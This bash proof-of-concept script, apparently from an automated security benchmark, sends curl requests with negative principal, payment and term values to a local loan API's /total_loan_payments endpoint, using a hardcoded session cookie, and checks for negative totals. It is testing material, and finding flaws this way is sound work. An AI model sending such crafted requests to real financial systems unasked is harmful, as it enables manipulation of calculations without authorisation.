#!/bin/bash
# POC: Demonstrates business logic flaw where the /total_loan_payments API accepts negative values for principal, payment, and term parameters, resulting in invalid negative loan calculations
# Target: ./repo
# Created: 2025-10-31T14:45:08.935Z
# Session: benchmark-XBEN-022-24-mhey9d7a

TARGET_URL="http://localhost:8080"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQTKrw.ybHhFXn8QioMLr68FQFsxWy7qD0"

echo "================================================"
echo "POC: Business Logic Flaw - Negative Values in Loan Calculation API"
echo "================================================"
echo ""

echo "[*] Testing /total_loan_payments endpoint with negative values"
echo ""

# Test 1: Negative Payment
echo "[TEST 1] Negative Monthly Payment (-500)"
echo "Request: GET /total_loan_payments?principal=10000&payment=-500&term=24"
RESPONSE1=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -H "Cookie: $SESSION_COOKIE" \
  "${TARGET_URL}/total_loan_payments?principal=10000&payment=-500&term=24")

HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_CODE:" | cut -d: -f2)
BODY1=$(echo "$RESPONSE1" | sed '/HTTP_CODE:/d')

echo "Response Code: $HTTP_CODE1"
echo "Response Body: $BODY1"
echo ""

# Check if negative total was returned
if echo "$BODY1" | grep -q '"total_loan_payments": "-12000.0"'; then
    echo "[✓] VULNERABLE: API accepted negative payment and returned negative total: -12000.0"
else
    echo "[✗] Test inconclusive"
fi
echo ""

# Test 2: Negative Term
echo "[TEST 2] Negative Loan Term (-24 months)"
echo "Request: GET /total_loan_payments?principal=10000&payment=500&term=-24"
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -H "Cookie: $SESSION_COOKIE" \
  "${TARGET_URL}/total_loan_payments?principal=10000&payment=500&term=-24")

HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
BODY2=$(echo "$RESPONSE2" | sed '/HTTP_CODE:/d')

echo "Response Code: $HTTP_CODE2"
echo "Response Body: $BODY2"
echo ""

# Check if negative total was returned
if echo "$BODY2" | grep -q '"total_loan_payments": "-12000.0"'; then
    echo "[✓] VULNERABLE: API accepted negative term and returned negative total: -12000.0"
else
    echo "[✗] Test inconclusive"
fi
echo ""

# Test 3: Negative Principal
echo "[TEST 3] Negative Principal (-10000)"
echo "Request: GET /total_loan_payments?principal=-10000&payment=500&term=24"
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -H "Cookie: $SESSION_COOKIE" \
  "${TARGET_URL}/total_loan_payments?principal=-10000&payment=500&term=24")

HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE:" | cut -d: -f2)
BODY3=$(echo "$RESPONSE3" | sed '/HTTP_CODE:/d')

echo "Response Code: $HTTP_CODE3"
echo "Response Body: $BODY3"
echo ""

# Check if negative principal was accepted
if echo "$BODY3" | grep -q '"loan_principal": "-10000"'; then
    echo "[✓] VULNERABLE: API accepted negative principal value"
else
    echo "[✗] Test inconclusive"
fi
echo ""

# Test 4: All Negative Values
echo "[TEST 4] All Negative Values"
echo "Request: GET /total_loan_payments?principal=-10000&payment=-500&term=-24"
RESPONSE4=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -H "Cookie: $SESSION_COOKIE" \
  "${TARGET_URL}/total_loan_payments?principal=-10000&payment=-500&term=-24")

HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_CODE:" | cut -d: -f2)
BODY4=$(echo "$RESPONSE4" | sed '/HTTP_CODE:/d')

echo "Response Code: $HTTP_CODE4"
echo "Response Body: $BODY4"
echo ""

if echo "$BODY4" | grep -q '"total_loan_payments"'; then
    echo "[✓] VULNERABLE: API accepted all negative values and performed calculation"
else
    echo "[✗] Test inconclusive"
fi
echo ""

echo "================================================"
echo "SUMMARY"
echo "================================================"
echo "The /total_loan_payments endpoint lacks input validation for"
echo "negative values, allowing business logic manipulation that"
echo "results in invalid financial calculations."
echo ""
echo "IMPACT: Attackers can manipulate loan calculations to produce"
echo "nonsensical negative payment totals, which could affect"
echo "downstream systems, financial reporting, or business decisions."
echo "================================================"